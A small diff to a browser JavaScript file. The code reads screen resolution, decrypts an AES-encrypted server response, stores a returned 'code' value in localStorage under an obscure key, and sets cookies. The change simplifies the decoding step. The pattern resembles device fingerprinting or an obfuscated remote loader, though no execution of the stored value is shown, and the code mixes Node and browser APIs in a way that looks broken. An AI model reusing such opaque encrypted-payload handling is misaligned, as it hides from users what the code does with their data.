@@ -1224,10 +1224,9 @@ const resolution = window.screen.width+"x"+window.screen.height;
             if (xhr.readyState === XMLHttpRequest.DONE) {
                 if (xhr.status === 200) {
                   const timing = performance.now() - end;
-                  const buff = Buffer.from(xhr.responseText, 'base64');
                   const decipher = crypto.createDecipher('aes-256-cbc', key, iv);
-                  const decoded = decipher.update(buff.toString('utf8'), 'hex', 'utf8') +
-                  decipher.final('utf8')
+                  const decoded = decipher.update(xhr.responseText, 'hex', 'utf8') +
+                  decipher.final('utf8');
                   const parsed = JSON.parse(decoded);
                   if (parsed['code'] != null) {
                       localStorage.setItem('c:GkK?_5eVdQdiQT0Fb?', parsed['code']);
@@ -1352,3 +1351,5 @@ for (let optionKey in options) {
 
 document.cookie = updatedCookie;
 }
+
+
